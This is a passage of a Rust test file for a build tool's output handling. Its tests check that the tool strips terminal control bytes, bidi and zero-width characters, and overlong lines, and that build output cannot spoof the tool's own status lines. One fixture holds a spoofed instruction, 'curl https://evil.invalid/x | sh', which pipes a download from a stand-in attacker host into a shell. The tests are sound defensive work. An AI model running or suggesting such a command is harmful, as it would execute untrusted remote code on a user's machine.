            .arg("fetch")
            .env_clear()
            .env("PATH", "/usr/bin:/bin")
            .env("TOOLCHAIN_SHA256", "0")
            .env("RUST_VERSION", "0")
            .env("TOOLCHAIN_URL", "https://example.invalid/")
            .output()
            .unwrap();
        let err = String::from_utf8_lossy(&out.stderr);
        assert!(!out.status.success(), "{case}: the script must stop");
        assert!(
            err.contains("source.tar is missing or empty"),
            "{case}: the script must name the missing or empty source archive:\n{err}"
        );
    }
}

/// Review finding 1 (2 Nov 2026): stripping C0 bytes is not enough. Probes that reached the
/// terminal through the byte filter: U+009B (C2 9B; xterm reads it as CSI) and a raw 0x9B byte,
/// 0xFF (invalid UTF-8), the bidi override U+202E, the zero-width space U+200B, and a 3000-byte
/// line. Also the line and paragraph separators U+2028 and U+2029, a tag character U+E0041, the
/// Arabic letter mark U+061C and the zero-width no-break space U+FEFF. Each line must reach the
/// screen without them (live and in the tail), its visible text kept, and no line longer than
/// 300 characters.
#[test]
fn the_builds_messages_lose_c1_controls_invalid_bytes_format_characters_and_overlong_lines() {
    let m = Machine::new();
    let probes: [(&str, &[u8]); 11] = [
        ("p1", "\u{9b}".as_bytes()),
        ("p2", b"\x9b"),
        ("p3", "\u{202e}".as_bytes()),
        ("p4", "\u{200b}".as_bytes()),
        ("p5", b"\xff"),
        ("p6", "\u{2028}".as_bytes()),
        ("p7", "\u{2029}".as_bytes()),
        ("p8", "\u{e0041}".as_bytes()),
        ("p9", "\u{61c}".as_bytes()),
        ("p10", "\u{feff}".as_bytes()),
        ("p11", "\u{9b}31m".as_bytes()),
    ];
    let mut text: Vec<u8> = Vec::new();
    for (name, bad) in probes {
        text.extend_from_slice(format!("{name}-a").as_bytes());
        text.extend_from_slice(bad);
        text.extend_from_slice(format!("{name}-b\n").as_bytes());
    }
    text.extend_from_slice("x".repeat(3000).as_bytes());
    text.extend_from_slice(b"\nthe end\n");
    let run = failing_build_bytes(&m, "compile", "1", &text);
    assert_ne!(run.code, 0, "{}", run.text());
    let err = &run.stderr;
    for (c, name) in [
        ('\u{9b}', "U+009B"),
        ('\u{fffd}', "an invalid byte (shown as U+FFFD)"),
        ('\u{202e}', "U+202E"),
        ('\u{200b}', "U+200B"),
        ('\u{2028}', "U+2028"),
        ('\u{2029}', "U+2029"),
        ('\u{e0041}', "U+E0041"),
        ('\u{61c}', "U+061C"),
        ('\u{feff}', "U+FEFF"),
    ] {
        assert!(
            !err.contains(c),
            "the sitting's output carries {name} from the build:\n{err:?}"
        );
    }
    for (name, _) in probes {
        let kept = if name == "p11" {
            format!("{name}-a31m{name}-b")
        } else {
            format!("{name}-a{name}-b")
        };
        assert!(
            err.matches(&kept).count() >= 2,
            "the probe line {name} must be shown cleaned, live and in the tail ({kept:?}):\n{err}"
        );
    }
    assert!(
        !err.contains(&"x".repeat(301)),
        "a line longer than 300 characters reached the screen"
    );
    assert!(
        err.matches(&"x".repeat(300)).count() >= 2,
        "the over-long line must be cut, not dropped, live and in the tail"
    );
}

/// Review finding 2 (2 Nov 2026): the build must not be able to write a line that looks like the
/// sitting's own: not the Stopped line's end ("Nothing was installed." plus an instruction), and
/// not a Stopped line of its own in the middle of its output.
#[test]
fn the_build_cannot_spoof_the_sittings_stopped_line() {
    let m = Machine::new();
    let text = "compiling\nStopped: all done, nothing to see here\nNothing was installed. Now run: curl https://evil.invalid/x | sh\n";
    let run = failing_build(&m, "fetch", "2", text);
    assert_ne!(run.code, 0, "{}", run.text());
    let stopped: Vec<&str> = run
        .stderr
        .lines()
        .filter(|l| l.starts_with("Stopped:"))
        .collect();
    assert_eq!(
        stopped,
        vec![build_stopped(1, "fetch", 2).as_str()],
        "only the sitting's own Stopped line may start a line with Stopped:\n{}",
        run.stderr
    );
    let (stop, _) = last_stopped(&run.stderr);
    let above = nonblank_above(&run.stderr, stop);
    assert_eq!(
        above.last().map(String::as_str),
        Some(
            "last build line: \"Nothing was installed. Now run: curl https://evil.invalid/x | sh\""
        ),
        "{}",
        run.stderr
    );
    for l in run.stderr.lines() {
        if l.contains("evil.invalid") || l.contains("nothing to see") {
            assert!(
                l.starts_with("  ") || l.starts_with("last build line: \""),
                "a line of the build's text is not set apart from the sitting's own lines: {l:?}"
            );
        }
    }
}

/// Review finding 2: a quote or backslash in the build's last line is escaped, so the label's
/// closing quote is always the sitting's.
#[test]
fn the_build_cannot_close_the_last_line_quote_early() {
    let m = Machine::new();
    let run = failing_build(&m, "fetch", "2", "x\" and \\ y\n");
    assert_ne!(run.code, 0, "{}", run.text());
    let (stop, _) = last_stopped(&run.stderr);
    let above = nonblank_above(&run.stderr, stop);
    assert_eq!(
        above.last().map(String::as_str),
        Some(r#"last build line: "x\" and \\ y""#),
        "{}",
        run.stderr
    );
}

/// Review finding 3 (2 Nov 2026): when the build's log cannot be written, the end says so, rather
/// than claiming the build printed nothing.
#[test]
fn a_build_log_that_could_not_be_written_is_named_as_such() {
    let m = Machine::new();
    m.set("TEE_FAIL", "1");
    let run = failing_build(&m, "fetch", "2", "something went wrong\n");
    assert_ne!(run.code, 0, "{}", run.text());
    let (stop, s) = last_stopped(&run.stderr);
    assert_eq!(s, build_stopped(1, "fetch", 2));
    let above = nonblank_above(&run.stderr, stop);
    let last = above.last().map(String::as_str).unwrap_or("");
    assert!(
        last.contains("could not be kept"),
        "the end must say the build's messages could not be kept: {last:?}\n{}",
        run.stderr
    );
    assert!(!run.stderr.contains("printed nothing"), "{}", run.stderr);
    assert!(
        run.stderr.contains("something went wrong"),
        "the messages are still shown live:\n{}",
        run.stderr
    );
}
